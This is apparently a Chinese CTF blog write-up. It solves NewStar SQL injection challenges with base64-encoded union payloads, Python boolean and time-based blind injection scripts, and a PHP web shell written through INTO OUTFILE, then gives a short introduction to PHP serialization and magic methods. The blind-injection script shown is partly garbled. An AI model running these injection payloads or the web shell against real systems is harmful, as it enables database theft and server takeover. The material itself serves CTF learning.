# Newstar_sql刷题

### 谢谢皮蛋

* 判断闭合方式
  尝试输入id为`1`，出现回显**（可以进行联合注入）**，使用HackBar，`LOAD`后发现`POST`启用
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/11/屏幕截图-2024-11-28-203150.png)

  查看源代码
  ```html
  <body>
    <div id="login-container">
      <img src="wipher.jpg" alt="Login Image">
      <form id="login-form" method="post" action="">
        <input type="text"  id="id" name="id" placeholder="input ID" class="input">
        <button type="submit" onclick="submitForm()" class="login-button">Search</button>
      </form>
    </div>
  
    <script>
      function submitForm() {
        var id = document.getElementById('id').value;
        id = btoa(id);
        document.getElementById('id').value = id;
        document.getElementById('login-form').submit();
      }
    </script>
  ```

  `<form id="login-form" method="post" action="">`确定用户输入的id通过POST上传
  `id = btoa(id);`确定输入的id经过base64加密上传至服务器
  开始判断闭合方式
  `payload：id=MVw=`（id=1\）,出现报错

  ```mysql
  You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '\ LIMIT 0,1' at line 1
  ```

  **可以判断这里是数字型注入，无闭合**

* 判断列数

  ```mysql
  payload：
  id=MSBvcmRlciBieSAx		//id=1 order by 1
  id=MSBvcmRlciBieSAy		//id=1 order by 2
  id=MSBvcmRlciBieSAz		//id=1 order by 3 报错
  ```

* 联合注入爆库名
  `payload：id=bnVsbCB1bmlvbiBzZWxlY3QgMSxkYXRhYmFzZSgp`
  （ id=null union select 1,database() ）
  得到当前库名为：**ctf**

* 爆表名
  `id=bnVsbCB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlICAKdGFibGVfc2NoZW1hPSJjdGYi`
  （ id=null union select 1,group_concat(table_name) from information_schema.tables where table_schema="ctf" ）
  得到表名：Fl4g

* 爆列名
  `payload：bnVsbCB1bmlvbiBzZWxlY3QgMSxncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSJjdGYiIGFuZCB0YWJsZV9uYW1lPSJGbDRnIg==`
  （id=null union select 1,group_concat(column_name) from information_schema.columns where table_schema="ctf" and table_name="Fl4g"）
  得到列名：**id,des,value**，~~这不一眼看出来flag在value里~~

* 爆数据（也可得flag
  `payload：id=bnVsbCB1bmlvbiBzZWxlY3QgZ3JvdXBfY29uY2F0KGRlcyksZ3JvdXBfY29uY2F0KHZhbHVlKSBmcm9tIEZsNGc=`（ id=null union select group_concat(des),group_concat(value) from Fl4g ）
  得**flag{NEwsT4r_CtF_Z0ZAdcaae68941b}**

### blindsql1

* 尝试判断闭合方式`Alice\`，**发现没有回显，同时确定可以注入**

* 尝试 ’ ，“ ，等方式，发现在`Alice' --+`时有特殊报错`”no: array(1) { [0]=> string(1) " " }“`通过比较确定（空格）被禁用，多次尝试后发现（空格）= **union**被禁用，可以尝试布尔盲注

* **主要步骤：写脚本**(这破东西研究一下午了)

  ```python
  import requests
  import time
  import string
  
  url='http://127.0.0.1:4772/'
  result=''
  
  for i in range(1,100):											/开始循环字数
      print(f'[+] booming {i}')
      pre_requests=''
      for c in string.ascii_letters + string.digits + '_-{}':		/要爆的字符
          time.sleep(0.1)											/防止服务器响应不及，但实测其实在本地上可以不用
  
          print("[+] trying:",c)
          
        	tables=f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'
          
  ```
          这一段有点死亡括号闭合了，主体就是mysql语句，跟上面一题类似，在information_schema.tables这个表里查询表名
          但是，这里用like语法代替”=“，（）代替了空格
          ```
      
          char=f'(ord(mid({tables},{i},1)))'		/其实可以一口气写完的，但为了可读性就分开了，这一步是截取表名的字符并转化为ascill码
      
          asc=f'(({char})in({ord(c)}))'			/这一步是比较我们循环的字符和表里的字符相不相同
      
          payload=f'Alice\'and({asc})#'			/拼装payload
      
          res=requests.get(url=url,params={'student_name':payload})
      
          if 'Alice' in res.text:
              print('[+] bingo',c)
              result += c
              print(result)
              break
  
  ```

* 然后再小改一下{tables}就可以用来爆列名，和数据了

* 拿到**flag{NEwSTAr_CTf-ZOZ488fd40be27}**（真慢啊~）
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/12/屏幕截图-2024-12-01-133110.png)

### blindsql2

* 情况和上一题类似，主要区别就是一道布尔盲注一道时间盲注

* 这里判断方式和上题一样

* ```python
  import requests
  import time
  import string
  
  url='http://127.0.0.1:1453/'
  result=''
  
  for i in range(1,100):
      print(f'[+] booming {i}')
      pre_requests=''
      for c in string.ascii_letters + string.digits + '_-{}':
          time.sleep(0.2)
  
          print("[+] trying:",c)
  
          tables=f'(Select(group_concat(column_name))from(information_schema.columns)where((table_schema)like(database())and((table_name)like(\'secrets\'))))'		/上一题写爆表名，这里写爆列名
  
          char=f'(ord(mid({tables},{i},1)))'
  
          asc=f'(({char})in({ord(c)}))'
  
          payload=f'Alice\'and(if(({asc}),sleep(5),0))#'		/修改payload，如果字符猜测正确则等待1s再传数据
  
          res=requests.get(url=url,params={'student_name':payload})
  
          if res.elapsed.total_seconds() > 5:		/修改判断语句，以相应时间为判断条件
              print('[+] bingo',c)
              result += c
              print(result)
              break
  
  ```

* 拿到**flag{N3WsT4r_ctf-ZOZ48904c0a7c7b}**（这是真费时间，而且你sleep时间少了甚至会出错，要爆了）

### sqlshell

* 根据提示，不在数据库，那就可以尝试提权找找服务器
* 将一句话木马通过sql注入到网站目录
* 尝试联合注入（因为没有啥符号被禁用了）
  `payload：null' Union Select 1,2,"<?php eval($_POST[0]);" into outfile '/var/www/html/1.php'`
* 然后在ip:port/1.php里用POST方式上传`0=system("cat /you_cannot_read_the_flag_directly");`
* 拿到**flag{bf4423e9-81ac-9d89-d266-acbcb5a5940a}**

# php反序化

### 这是什么的

- **序列化** 是将 PHP 对象转换为字符串的过程，可以使用 `serialize()` 函数来实现。该函数将对象的状态以及它的类名和属性值编码为一个字符串。序列化后的字符串可以存储在文件中，存储在数据库中，或者通过网络传输到其他地方。
- **反序列化** 是将序列化后的字符串转换回 PHP 对象的过程，可以使用 `unserialize()` 函数来实现。该函数会将序列化的字符串解码，并将其转换回原始的 PHP 对象。
- **序列化的目的**是方便数据的存储，在 PHP 中，他们常被用到缓存、session、cookie 等地方。

### 例子

* 一个简单的php对象例子
  ```php
  <?php
  class User {
  public $name;
  
  public function __construct($name) {
          $this->name = $name;
      }
  }
  ```

  同时创建一个`$user = new User("Probius_Official");`

* 序列化并输出
  ```php
  $serializedData = serialize($user);
  echo $serializedData . "\n";
  ```

  然后输出
  ```php
  O:4:"User":1:{s:4:"name";s:16:"Probius_Official";}
  ```

  解释上面内容就是
  ![](https://blog.chrizsty.cn/wp-content/uploads/2024/12/202305112206154.png)

  依此，每添加属性后就会在前面**蓝色框**里添加**属性名**，在后面**花括号**里写**值**

### 其他标识

除了上面常见的几个序列化字母标识外，还有其他标识 , 这里我们一起总结一下:

- a:array 数组

```
echo serialize(array(1,2)); --- a:2:{i:0;i:1;i:1;i:2;}
```

- b:boolean bool 值

```
echo serialize(true);  ---- b:1;
echo serialize(false); ---- b:0;
```

- C:custom object 自定义对象序列化

使用 Serializable 接口定义了序列化和反序列化方法的类

```
class yourClassName implements Serializable
```

- d:double 小数

```
echo serialize(1.1); ---- d:1.1;
```

- i:integer 整数

```
echo serialize(114); ---- i:114;
```

- o:commonObject 对象

```
似乎在php4的时候就弃用了
```

- O:Object 对象

```
class a{}
echo serialize(new a());
------ O:1:"a":0:{}
```

- s:string 字符串

```
class a{}
echo serialize(new a());
------ O:1:"a":0:{}
```

- S:encoded string

```
S:1:"\61"; --- 可以将16进制编码成字符，可以进行绕过特定字符
```

- N:null NULL 值

```
echo serialize(NULL); --- N;
```



### 魔术方法

* **定义**
  在 PHP 的序列化中，魔术方法（Magic Methods）是一组特殊的方法，这些方法以双下划线（`__`）作为前缀，可以在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 / 反序列化 的过程。

* **常见魔术方法**

  ```
   __wakeup() //------ 执行unserialize()时，先会调用这个函数
   __sleep() //------- 执行serialize()时，先会调用这个函数
   __destruct() //---- 对象被销毁时触发
   __call() //-------- 在对象上下文中调用不可访问的方法时触发
   __callStatic() //-- 在静态上下文中调用不可访问的方法时触发
   __get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法
   __set() //--------- 用于将数据写入不可访问的属性
   __isset() //------- 在不可访问的属性上调用isset()或empty()触发
   __unset() //------- 在不可访问的属性上使用unset()时触发
   __toString() //---- 把类当作字符串使用时触发
   __invoke() //------ 当尝试将对象调用为函数时触发
  ```

### 总结

* php序列化和反序列化可以是一个很好用的备份方式
* 但在用户可控反序列化内容后，会被利用里面的魔术方法，从而导致漏洞的出现
